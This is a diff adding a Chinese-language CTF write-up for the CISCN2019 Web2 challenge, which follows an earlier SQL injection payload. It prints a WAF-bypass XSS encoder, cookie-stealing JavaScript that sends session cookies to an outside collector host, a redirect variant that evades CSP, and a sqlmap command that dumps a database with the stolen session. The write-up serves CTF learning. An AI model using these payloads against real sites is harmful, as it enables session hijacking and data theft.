@@ -435,5 +435,54 @@ errorXPATH syntax error: 'ctfusers'
 payload:1' where `user_id`=updatexml(1,concat(1,(select load_file('/flag.txt'))),1)#
 ```
 
+## [CISCN2019 华东北赛区]Web2
 
+很明显的XSS题了，可以写页面，可以反馈给bot。
+
+怎么绕waf呢
+
+第一步通过``<svg><script>eval(xss)</script>``的方式绕过
+
+然后waf对于``()``等的绕过通过HTMLMarkUp的方式绕过
+
+Poc:
+
+```python
+xss ="alert('123');"
+output = ""
+for ch in xss:
+    output += "&#" + str(ord(ch))
+
+print("<svg><script>eval&#40&#34" + output + "&#34&#41</script>")
+```
+
+然后直接塞xss平台上的代码好像不行，有个CSP
+
+```js
+(function(){(new Image()).src='http://xss.buuoj.cn/index.php?do=api&id=U3widY&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+if(''==1){keep=new Image();keep.src='http://xss.buuoj.cn/index.php?do=keepsession&id=U3widY&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
+```
+
+```
+4026effd74d5780b0b55936f19dff219.html:1 Refused to load the image 'http://xss.buuoj.cn/index.php?do=api&id=U3widY&location=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&toplocation=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&cookie=_ga%3DGA1.2.2113857027.1593076385%3B%20PHPSESSID%3Def70ae11f5564d115dc99d63fe49ff02&opener=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post.php' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.
+```
+
+用跳转来绕过
+
+```js
+(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=U3wid&keepsession=0
+ &location='+escape((function(){try{return document.location.href}catch(e){return''}})())+
+ '&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+
+ '&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+
+ '&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();
+```
+
+
+然后拿到cookie可以进``/admin.php``了
+
+存在sql注入，用sqlmap 跑一下就行
+
+```
+sqlmap -u "http://cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/admin.php?id=2" --cookie="PHPSESSID=b81d5f73388c74a98372f0bddcb6ba2d" -p id -D ciscn -T flag --dump
+```
 
